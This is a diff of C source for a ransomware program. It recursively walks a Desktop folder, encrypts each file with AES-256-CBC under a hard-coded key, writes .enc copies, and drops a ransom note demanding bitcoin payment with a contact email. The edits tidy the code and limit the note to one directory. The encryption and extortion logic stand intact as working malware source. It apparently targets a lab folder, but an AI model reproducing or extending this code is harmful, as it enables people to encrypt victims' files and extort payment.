@@ -18,15 +18,12 @@ int main()
     char* home;
     char* uid;
     uid_t user_id;
-   	struct passwd *user_pw;
-    
     struct passwd *lpwd;
-    printf("UID    : %d\n",getuid());
-    printf("EUID   : %d\n" ,geteuid());
-       
+
+    //printf("EUID   : %d\n" ,geteuid());
+    //GETEUID()_effective user Identification
     lpwd = getpwuid(geteuid());
-    printf("EUNAME : %s\n", lpwd->pw_name);
-    
+    //printf("EUNAME : %s\n", lpwd->pw_name);
     
     home = "/home/";
     start_path = (char*) malloc(strlen(home)+strlen(lpwd->pw_name)+strlen("/Desktop/ransomware/")+2);
@@ -42,44 +39,49 @@ int main()
 
 void ls_dir(char* start_path)
 {
-    unsigned char key[] = "12345678901234561234567890123456";                                              
-    unsigned char iv[] = "1234567890123456";                                                               
-    DIR* dir;                                                                                                 
-    struct dirent *ent;                                                                                        
+    unsigned char key[] = "12345678901234561234567890123456";
+    unsigned char iv[] = "1234567890123456";
+    DIR* dir;
+    struct dirent *ent;
     if((dir=opendir(start_path)) !=NULL)
     {
         while((ent=readdir(dir)) !=NULL)
         {
             int len = strlen(ent->d_name);
             const char* last_four = &ent->d_name[len-4];
-            if(strcmp(last_four,".enc") != 0)                                                                  
+            if(strcmp(last_four,".enc") != 0)
             {
-                if(ent->d_type == 8)                                                                            
+                if(ent->d_type == 8)
                 {
-                    char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(start_path)+2);   
-                    strcpy(full_path_readme,start_path);                                                        
-                    strcat(full_path_readme,"RANSOMEWARE_INFO");                                                
-                    char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);                 
+                    char* full_path_readme =(char*) malloc(strlen("RANSOMWARE_INFO.txt")+strlen(start_path)+2);
+                    strcpy(full_path_readme,start_path);
+                    strcat(full_path_readme,"RANSOMWARE_INFO.txt");
+                    char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);
                     strcpy(full_path,start_path);
-                    strcat(full_path,ent->d_name);                                                             
-                    char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);                       
+                    strcat(full_path,ent->d_name);
+                    char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);
                     strcpy(new_name,full_path);
                     strcat(new_name,".enc");
                     
-                    if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)   
+                    if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)
                     {
-                        FILE* fpin;     
-                        FILE* fpout;    
-                        FILE* fpreadme; 
+                        FILE* fpin;
+                        FILE* fpout;
+                        FILE* fpreadme;
                         
                         fpin=fopen(full_path,"rb");
                         fpout=fopen(new_name,"wb");
                         
-                        fpreadme=fopen(full_path_readme,"w");                                                 
-                        fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
-                        fclose(fpreadme);
-                                                
-                        encryptfile(fpin,fpout,key,iv);                                                       
+                        //ONLY ONE RANSOMWARE_INFO
+                        //start_path = current path
+                        //printf("%zu", strlen(start_path));  //35
+                        if (strlen(start_path)==35){
+                            fpreadme=fopen(full_path_readme,"w");
+                            fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
+                            fclose(fpreadme);
+                        }
+                        
+                        encryptfile(fpin,fpout,key,iv);
                         
                         fclose(fpin);
                         fclose(fpout);
@@ -89,16 +91,16 @@ void ls_dir(char* start_path)
                     free(full_path);
                     free(new_name);
                 }
-                else if(ent->d_type==4)                                                                         
+                else if(ent->d_type==4)
                 {
                     char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
-                    strcpy(full_path,start_path);                                                               
-                    strcat(full_path,ent->d_name);                                                              
-                    strcat(full_path,"/");                                                                     
+                    strcpy(full_path,start_path);
+                    strcat(full_path,ent->d_name);
+                    strcat(full_path,"/");
                     printf("%s\n",full_path);
                     if(full_path != start_path && ent->d_name[0] != '.')
                     {
-                        ls_dir(full_path);                                                                      
+                        ls_dir(full_path);
                     }
                     
                     free(full_path);
@@ -118,15 +120,15 @@ void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
     
     EVP_CIPHER_CTX ctx;
     
-    EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);              
-    blocksize = EVP_CIPHER_CTX_block_size(&ctx);                    
+    EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);
+    blocksize = EVP_CIPHER_CTX_block_size(&ctx);
     cipher_buf = malloc(bufsize+blocksize);
     
     while(1)
     {
-        int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);    
-        EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);       
-        fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);      
+        int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
+        EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);
+        fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
         if(bytes_read < bufsize)
         {
             break;
